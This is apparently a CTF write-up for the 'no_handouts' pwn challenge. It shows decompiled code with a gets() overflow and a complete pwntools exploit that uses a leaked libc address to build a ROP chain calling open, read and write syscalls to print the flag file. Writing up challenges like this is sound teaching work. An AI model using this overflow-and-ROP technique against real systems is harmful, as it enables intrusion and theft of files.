# no_handouts (PWN)  
```
I just found a way to Kill ROP. I think. Maybe?
```
![image](https://github.com/user-attachments/assets/e1b0e281-dab6-49d6-be7c-39f4ea849a64)

![image](https://github.com/user-attachments/assets/fca8482e-1a5a-4af5-ba9b-7bd0bd85029c)  
Ok, so we get a libc leak right off the bat, lets see what the binary looks like.  

```c
undefined8 vuln(void)

{
  char local_28 [32];
  
  puts("system() only works if there\'s a shell in the first place!");
  printf("Don\'t believe me? Try it yourself: it\'s at %p\n",system);
  puts("Surely that\'s not enough information to do anything else.");
  gets(local_28);
  return 0;
}
```

Oh, ok...   
So there's no shell, `allegedly`, so we need another way of getting the flag.  
What we can do is use syscalls to first `open()`, then `read()` and then `write()` the flag.  

First we use `ROP` to write the flag path string somewhere in memory.  
```python
 #Write flag path to memory
    log.info("writing flag path to " + hex(writeable_section))
    payload += p64(pop_rsi_ret) + p64(writeable_section) 
    payload += p64(pop_rdi_ret) + bytes(flag_path[:8],'ascii')
    payload += p64(mov_qwordrsi_rdi_ret)
    
    payload += p64(pop_rsi_ret) + p64(writeable_section+8)
    payload += p64(pop_rdi_ret) + bytes(flag_path[8:],'ascii') + b'\x00'*(8-len(flag_path[8:]))
    payload += p64(mov_qwordrsi_rdi_ret)

```


Then we use that written string to make our syscalls.

```python
#make open syscall
    payload += p64(pop_rdi_ret) + p64(writeable_section)
    payload += p64(pop_rsi_ret) + p64(0x0)
    payload += p64(pop_rdx_pop_r12_ret) + p64(0) + p64(0)
    payload += p64(pop_rax_ret) + p64(0x2)
    payload += p64(syscall)

    #make read syscall
    #payload += p64(pop_rdi_ret) + p64(3)
    #set up so that we can move rax rdi 
    payload += p64(pop_rcx_ret) + p64(1000000000) + p64(pop_rdx_pop_r12_ret) + p64(0) + p64(0) + p64(mov_rdi_rax_dostuff_if_rcx_large)
    payload += p64(pop_rax_ret) + p64(0)
    payload += p64(pop_rsi_ret) + p64(writeable_section)
    payload += p64(pop_rdx_pop_r12_ret) + p64(0x50) + p64(0)
    payload += p64(syscall)

    #make write syscall
    payload += p64(pop_rax_ret) + p64(1)
    payload += p64(pop_rdi_ret) + p64(1)
    payload += p64(pop_rsi_ret) + p64(writeable_section)
    payload += p64(pop_rdx_pop_r12_ret) + p64(0x50) + p64(0)
    payload += p64(syscall)
```

All together:  
```python
#/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")
libc = ELF("libc.so.6")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.pwnoh.io", 13371)

    return r


def main():
    io = conn()

    #gdb.attach(io)
    io.recvuntil(b'it\'s at')[4:]
    leak = io.recvline()[1:-1]
    system_addr = int(leak,16)
    
    log.success("Leaked system " + leak.decode())
    
    system_offset = 0x7f4d5c850d70 - 0x7f4d5c800000
    print(system_offset, system_addr)
    libc.address = system_addr - system_offset 
    log.success("base of libc at "+ hex(libc.address))
    
    offset = 0x28
    flag_path = '/app/flag.txt'
    #0x000000000002a3e5: pop rdi; ret;
    pop_rdi_ret = 0x2a3e5 + libc.address 
    #0x0000000000141c51: mov qword ptr [rsi], rdi; ret; 
    mov_qwordrsi_rdi_ret = 0x141c51 + libc.address
    #0x000000000002be51: pop rsi; ret;
    pop_rsi_ret = 0x2be51 + libc.address
    #0x000000000011f2e7: pop rdx; pop r12; ret;
    pop_rdx_pop_r12_ret = 0x11f2e7 + libc.address
    writeable_section = libc.address +  0x7fbd9521a000 - 0x7fbd95000000
    #0x0000000000091316: syscall; ret;
    syscall = 0x91316 + libc.address
    #0x0000000000045eb0: pop rax; ret;
    pop_rax_ret = 0x45eb0 + libc.address
    #0x0000000000041563: push rax; ret;
    push_rax_ret = 0x41563 + libc.address
    
    #0x0000000000174f5b: push rax; pop rbx; ret;
    #0x000000000005a272: mov rdi, rax; cmp rdx, rcx; jae 0x5a25c; mov rax, r8; ret;
    #0x000000000008a200: mov r12, rax; mov rax, r12; pop r12; ret;
    #0x000000000003d1ee: pop rcx; ret;
    pop_rcx_ret = 0x3d1ee + libc.address
    mov_rdi_rax_dostuff_if_rcx_large = 0x5a272 + libc.address
    

    payload = 0x28*b'A'
    # Write flag path to memory
    log.info("writing flag path to " + hex(writeable_section))
    payload += p64(pop_rsi_ret) + p64(writeable_section) 
    payload += p64(pop_rdi_ret) + bytes(flag_path[:8],'ascii')
    payload += p64(mov_qwordrsi_rdi_ret)
    
    payload += p64(pop_rsi_ret) + p64(writeable_section+8)
    payload += p64(pop_rdi_ret) + bytes(flag_path[8:],'ascii') + b'\x00'*(8-len(flag_path[8:]))
    payload += p64(mov_qwordrsi_rdi_ret)
   
    #make open syscall
    payload += p64(pop_rdi_ret) + p64(writeable_section)
    payload += p64(pop_rsi_ret) + p64(0x0)
    payload += p64(pop_rdx_pop_r12_ret) + p64(0) + p64(0)
    payload += p64(pop_rax_ret) + p64(0x2)
    payload += p64(syscall)

    #make read syscall
    #payload += p64(pop_rdi_ret) + p64(3)
    #set up so that we can move rax rdi 
    payload += p64(pop_rcx_ret) + p64(1000000000) + p64(pop_rdx_pop_r12_ret) + p64(0) + p64(0) + p64(mov_rdi_rax_dostuff_if_rcx_large)
    payload += p64(pop_rax_ret) + p64(0)
    payload += p64(pop_rsi_ret) + p64(writeable_section)
    payload += p64(pop_rdx_pop_r12_ret) + p64(0x50) + p64(0)
    payload += p64(syscall)

    #make write syscall
    payload += p64(pop_rax_ret) + p64(1)
    payload += p64(pop_rdi_ret) + p64(1)
    payload += p64(pop_rsi_ret) + p64(writeable_section)
    payload += p64(pop_rdx_pop_r12_ret) + p64(0x50) + p64(0)
    payload += p64(syscall)

    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```





![image](https://github.com/user-attachments/assets/6a8b5059-54f3-49dc-9674-212f1f13c84d)
